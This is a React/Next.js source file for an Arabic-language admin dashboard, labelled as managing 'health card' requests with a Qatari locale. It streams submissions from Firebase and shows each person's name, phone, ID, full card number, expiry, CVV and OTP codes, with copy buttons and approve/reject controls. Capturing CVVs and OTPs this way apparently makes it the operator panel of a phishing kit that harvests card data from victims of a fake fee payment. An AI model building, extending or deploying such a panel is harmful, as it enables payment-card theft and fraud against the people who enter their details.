'use client'

import { useEffect, useState } from 'react'
import { useRouter } from 'next/navigation'
import { onAuthStateChanged, signOut, User } from 'firebase/auth'
import { auth, db } from '@/lib/firebase'
import { collection, onSnapshot, doc, updateDoc, query } from 'firebase/firestore'
import { Card, CardContent, CardHeader, CardTitle } from '@/app/components/ui/card'
import { Button } from '@/app/components/ui/button'
import {
  CheckCircle, XCircle, Clock, User as UserIcon,
  Phone, Shield, RefreshCw, LogOut, Wifi, Copy, Check
} from 'lucide-react'

interface Submission {
  id: string
  name: string
  phone: string
  cardNumber: string
  dateMonth: string
  datayaer: string
  CVC: string
  otpArr: string[]
  cardState: 'pending' | 'approved' | 'rejected'
  method?: string
  createdAt?: number
}

function formatCardDisplay(num: string) {
  if (!num) return '•••• •••• •••• ••••'
  const clean = num.replace(/\D/g, '')
  return clean.replace(/(.{4})/g, '$1 ').trim()
}

function CardMockup({ sub }: { sub: Submission }) {
  const isVisa = !sub.method || sub.method === 'visa'
  const approved = sub.cardState === 'approved'
  const rejected = sub.cardState === 'rejected'

  const bgGradient = approved
    ? 'from-emerald-700 via-emerald-600 to-teal-500'
    : rejected
    ? 'from-gray-700 via-gray-600 to-gray-500'
    : 'from-[#1a1a2e] via-[#16213e] to-[#0f3460]'

  return (
    <div className={`relative w-full max-w-[340px] mx-auto rounded-2xl bg-gradient-to-br ${bgGradient} p-5 text-white shadow-2xl overflow-hidden select-none`}
      style={{ aspectRatio: '1.586' }}>
      <div className="absolute inset-0 opacity-10">
        <div className="absolute -top-10 -right-10 w-48 h-48 rounded-full bg-white" />
        <div className="absolute -bottom-16 -left-8 w-56 h-56 rounded-full bg-white" />
      </div>

      <div className="relative flex flex-col h-full justify-between">
        <div className="flex items-start justify-between">
          <div>
            <div className="text-[10px] text-white/60 uppercase tracking-widest">بطاقة مصرفية</div>
            <div className="text-xs font-semibold mt-0.5 opacity-80">
              {approved ? '✓ مقبولة' : rejected ? '✗ مرفوضة' : '◌ قيد المراجعة'}
            </div>
          </div>
          <Wifi className="w-6 h-6 opacity-60 rotate-90" />
        </div>

        <div>
          <div className="w-10 h-7 rounded bg-gradient-to-br from-yellow-300 to-yellow-500 mb-4 opacity-90" />
          <div className="font-mono text-lg tracking-widest font-bold text-center" dir="ltr">
            {formatCardDisplay(sub.cardNumber)}
          </div>
        </div>

        <div className="flex items-end justify-between">
          <div>
            <div className="text-[9px] text-white/50 uppercase tracking-widest mb-0.5">Card Holder</div>
            <div className="text-sm font-semibold truncate max-w-[160px]">{sub.name || '—'}</div>
          </div>
          <div className="text-center">
            <div className="text-[9px] text-white/50 uppercase tracking-widest mb-0.5">Expires</div>
            <div className="text-sm font-mono font-semibold" dir="ltr">
              {sub.dateMonth && sub.datayaer ? `${sub.dateMonth}/${sub.datayaer}` : '••/••'}
            </div>
          </div>
          <div>
            {isVisa ? (
              <img src="/R.png" alt="Visa" className="h-7 w-auto brightness-200 contrast-0 invert" />
            ) : (
              <img src="/m.png" alt="Mastercard" className="h-7 w-auto" />
            )}
          </div>
        </div>
      </div>
    </div>
  )
}

function CopyButton({ text }: { text: string }) {
  const [copied, setCopied] = useState(false)
  const copy = () => {
    navigator.clipboard.writeText(text).then(() => {
      setCopied(true)
      setTimeout(() => setCopied(false), 1500)
    })
  }
  return (
    <button onClick={copy} className="ml-2 text-gray-400 hover:text-gray-600 transition-colors" title="نسخ">
      {copied ? <Check className="w-3.5 h-3.5 text-green-500" /> : <Copy className="w-3.5 h-3.5" />}
    </button>
  )
}

function InfoRow({ label, value, mono = false, copyable = false }: { label: string; value: string; mono?: boolean; copyable?: boolean }) {
  return (
    <div className="flex flex-col gap-0.5">
      <span className="text-[11px] text-gray-400 font-medium">{label}</span>
      <div className="flex items-center">
        <span className={`text-sm font-semibold text-gray-900 ${mono ? 'font-mono' : ''}`} dir="ltr">
          {value || '—'}
        </span>
        {copyable && value && <CopyButton text={value} />}
      </div>
    </div>
  )
}

export default function Dashboard() {
  const router = useRouter()
  const [user, setUser] = useState<User | null>(null)
  const [authLoading, setAuthLoading] = useState(true)
  const [submissions, setSubmissions] = useState<Submission[]>([])
  const [dataLoading, setDataLoading] = useState(true)
  const [updating, setUpdating] = useState<string | null>(null)

  useEffect(() => {
    const unsub = onAuthStateChanged(auth, (u) => {
      if (u) { setUser(u) } else { router.replace('/login') }
      setAuthLoading(false)
    })
    return () => unsub()
  }, [router])

  useEffect(() => {
    if (!user) return
    const unsub = onSnapshot(query(collection(db, 'pays')), (snap) => {
      const data = snap.docs.map(d => ({ id: d.id, ...d.data() })) as Submission[]
      data.sort((a, b) => (b.createdAt || 0) - (a.createdAt || 0))
      setSubmissions(data)
      setDataLoading(false)
    }, (err) => { console.error(err); setDataLoading(false) })
    return () => unsub()
  }, [user])

  const handleLogout = async () => { await signOut(auth); router.replace('/login') }

  const updateState = async (id: string, state: 'approved' | 'rejected') => {
    setUpdating(id)
    try { await updateDoc(doc(db, 'pays', id), { cardState: state }) } catch (e) { console.error(e) }
    setUpdating(null)
  }

  const stats = {
    total: submissions.length,
    pending: submissions.filter(s => !s.cardState || s.cardState === 'pending').length,
    approved: submissions.filter(s => s.cardState === 'approved').length,
    rejected: submissions.filter(s => s.cardState === 'rejected').length,
  }

  const stateBadge = (s?: string) => {
    if (s === 'approved') return { label: 'مقبول', cls: 'bg-green-100 text-green-800 border border-green-200' }
    if (s === 'rejected') return { label: 'مرفوض', cls: 'bg-red-100 text-red-800 border border-red-200' }
    return { label: 'قيد المراجعة', cls: 'bg-yellow-100 text-yellow-800 border border-yellow-200' }
  }

  if (authLoading) return (
    <div className="min-h-screen flex items-center justify-center bg-gray-50">
      <div className="text-center">
        <RefreshCw className="w-10 h-10 animate-spin text-[#8A1538] mx-auto mb-3" />
        <p className="text-gray-500 text-sm">جاري التحقق من الجلسة...</p>
      </div>
    </div>
  )

  if (!user) return null

  return (
    <div className="min-h-screen bg-gray-100" dir="rtl">
      <div className="bg-[#8A1538] text-white py-4 px-4 shadow-lg">
        <div className="max-w-7xl mx-auto flex flex-col sm:flex-row sm:items-center justify-between gap-3">
          <div>
            <h1 className="text-lg font-bold">لوحة التحكم</h1>
            <p className="text-white/60 text-xs">إدارة طلبات البطاقة الصحية — مباشر</p>
          </div>
          <div className="flex items-center gap-3 w-full sm:w-auto justify-between sm:justify-start">
            <span className="hidden sm:block text-xs text-white/70">{user.email}</span>
            <Button onClick={handleLogout} size="sm" variant="outline"
              className="border-white/30 text-white bg-white/10 hover:bg-white/20 gap-1.5 text-xs">
              <LogOut className="w-3.5 h-3.5" />خروج
            </Button>
          </div>
        </div>
      </div>

      <div className="max-w-7xl mx-auto px-4 py-6 space-y-6">
        <div className="grid grid-cols-2 md:grid-cols-4 gap-3">
          {[
            { label: 'إجمالي', value: stats.total, icon: UserIcon, cls: 'bg-blue-50 text-blue-700' },
            { label: 'قيد المراجعة', value: stats.pending, icon: Clock, cls: 'bg-yellow-50 text-yellow-700' },
            { label: 'مقبول', value: stats.approved, icon: CheckCircle, cls: 'bg-green-50 text-green-700' },
            { label: 'مرفوض', value: stats.rejected, icon: XCircle, cls: 'bg-red-50 text-red-700' },
          ].map((s, i) => (
            <Card key={i} className="border-0 shadow-sm bg-white">
              <CardContent className="p-4 flex items-center gap-3">
                <div className={`p-2 rounded-xl ${s.cls}`}><s.icon className="w-5 h-5" /></div>
                <div>
                  <div className="text-2xl font-bold text-gray-900">{s.value}</div>
                  <div className="text-xs text-gray-500">{s.label}</div>
                </div>
              </CardContent>
            </Card>
          ))}
        </div>

        {dataLoading ? (
          <div className="py-20 text-center">
            <RefreshCw className="w-8 h-8 animate-spin text-[#8A1538] mx-auto mb-3" />
            <p className="text-gray-500 text-sm">جاري تحميل البيانات...</p>
          </div>
        ) : submissions.length === 0 ? (
          <div className="py-20 text-center text-gray-400">
            <Shield className="w-14 h-14 mx-auto mb-3 opacity-20" />
            <p className="font-medium">لا توجد طلبات بعد</p>
          </div>
        ) : (
          <div className="space-y-5">
            {submissions.map((sub) => {
              const { label, cls } = stateBadge(sub.cardState)
              const isUpdating = updating === sub.id
              const isPending = !sub.cardState || sub.cardState === 'pending'
              const fullCard = (sub.cardNumber || '').replace(/\D/g, '')
              const groupedCard = fullCard.replace(/(.{4})/g, '$1 ').trim()

              return (
                <div key={sub.id} className="bg-white rounded-2xl shadow-sm overflow-hidden border border-gray-100">
                  <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-2 px-5 py-3 border-b border-gray-100 bg-gray-50/60">
                    <div className="flex items-center gap-2">
                      <span className={`px-2.5 py-1 rounded-full text-xs font-semibold ${cls}`}>{label}</span>
                      <span className="text-xs text-gray-400">رقم الهوية: <span className="font-mono font-semibold text-gray-700">{sub.id}</span></span>
                    </div>
                    {sub.createdAt && (
                      <span className="text-xs text-gray-400">
                        {new Date(sub.createdAt).toLocaleString('ar-QA', { dateStyle: 'short', timeStyle: 'short' })}
                      </span>
                    )}
                  </div>

                  <div className="p-5">
                    <div className="flex flex-col lg:flex-row gap-6">
                      <div className="lg:w-[340px] flex-shrink-0">
                        <CardMockup sub={sub} />
                        <div className="mt-3 bg-gray-50 rounded-xl p-3 border border-gray-100" dir="ltr">
                          <div className="text-[10px] text-gray-400 mb-1 text-right">رقم البطاقة كاملاً</div>
                          <div className="flex items-center justify-between">
                            <span className="font-mono text-base font-bold text-gray-900 tracking-widest">
                              {groupedCard || '— — — —'}
                            </span>
                            {groupedCard && <CopyButton text={fullCard} />}
                          </div>
                        </div>
                      </div>

                      <div className="flex-1 space-y-5">
                        <div>
                          <h3 className="text-xs font-semibold text-gray-400 uppercase tracking-wider mb-3 flex items-center gap-1.5">
                            <UserIcon className="w-3.5 h-3.5" /> المعلومات الشخصية
                          </h3>
                          <div className="grid grid-cols-1 sm:grid-cols-2 gap-3 bg-gray-50 rounded-xl p-4 border border-gray-100">
                            <InfoRow label="الاسم الكامل" value={sub.name} />
                            <InfoRow label="رقم الهاتف" value={sub.phone} mono copyable />
                            <InfoRow label="رقم الهوية" value={sub.id} mono copyable />
                            <InfoRow label="طريقة الدفع" value={sub.method === 'mastercard' ? 'Mastercard' : 'Visa'} />
                          </div>
                        </div>

                        <div>
                          <h3 className="text-xs font-semibold text-gray-400 uppercase tracking-wider mb-3 flex items-center gap-1.5">
                            <Shield className="w-3.5 h-3.5" /> بيانات البطاقة
                          </h3>
                          <div className="grid grid-cols-1 sm:grid-cols-2 gap-3 bg-gray-50 rounded-xl p-4 border border-gray-100">
                            <div className="sm:col-span-2">
                              <InfoRow label="رقم البطاقة" value={groupedCard} mono copyable />
                            </div>
                            <InfoRow label="تاريخ الانتهاء" value={sub.dateMonth && sub.datayaer ? `${sub.dateMonth}/${sub.datayaer}` : '—'} mono />
                            <InfoRow label="CVV" value={sub.CVC} mono copyable />
                          </div>
                        </div>

                        {sub.otpArr && sub.otpArr.filter(Boolean).length > 0 && (
                          <div>
                            <h3 className="text-xs font-semibold text-gray-400 uppercase tracking-wider mb-3 flex items-center gap-1.5">
                              <Phone className="w-3.5 h-3.5" /> رموز التحقق (OTP)
                            </h3>
                            <div className="bg-gray-50 rounded-xl p-4 border border-gray-100">
                              <div className="flex flex-wrap gap-2">
                                {sub.otpArr.filter(Boolean).map((otp, i) => (
                                  <div key={i} className="flex items-center gap-1 bg-white border border-gray-200 rounded-lg px-3 py-1.5 shadow-sm">
                                    <span className="text-[10px] text-gray-400 font-medium">#{i + 1}</span>
                                    <span className="font-mono text-sm font-bold text-gray-900 tracking-widest">{otp}</span>
                                    <CopyButton text={otp} />
                                  </div>
                                ))}
                              </div>
                            </div>
                          </div>
                        )}

                        {isPending && (
                          <div className="flex flex-col sm:flex-row gap-3 pt-1">
                            <Button
                              disabled={isUpdating}
                              onClick={() => updateState(sub.id, 'approved')}
                              className="flex-1 bg-green-600 hover:bg-green-700 text-white gap-2 h-10"
                            >
                              {isUpdating ? <RefreshCw className="w-4 h-4 animate-spin" /> : <CheckCircle className="w-4 h-4" />}
                              قبول الطلب
                            </Button>
                            <Button
                              disabled={isUpdating}
                              onClick={() => updateState(sub.id, 'rejected')}
                              className="flex-1 bg-red-600 hover:bg-red-700 text-white gap-2 h-10"
                            >
                              {isUpdating ? <RefreshCw className="w-4 h-4 animate-spin" /> : <XCircle className="w-4 h-4" />}
                              رفض الطلب
                            </Button>
                          </div>
                        )}

                        {!isPending && (
                          <div className={`rounded-xl p-3 text-center text-sm font-semibold ${
                            sub.cardState === 'approved'
                              ? 'bg-green-50 text-green-700 border border-green-200'
                              : 'bg-red-50 text-red-700 border border-red-200'
                          }`}>
                            {sub.cardState === 'approved' ? '✓ تم قبول هذا الطلب' : '✗ تم رفض هذا الطلب'}
                          </div>
                        )}
                      </div>
                    </div>
                  </div>
                </div>
              )
            })}
          </div>
        )}
      </div>
    </div>
  )
}
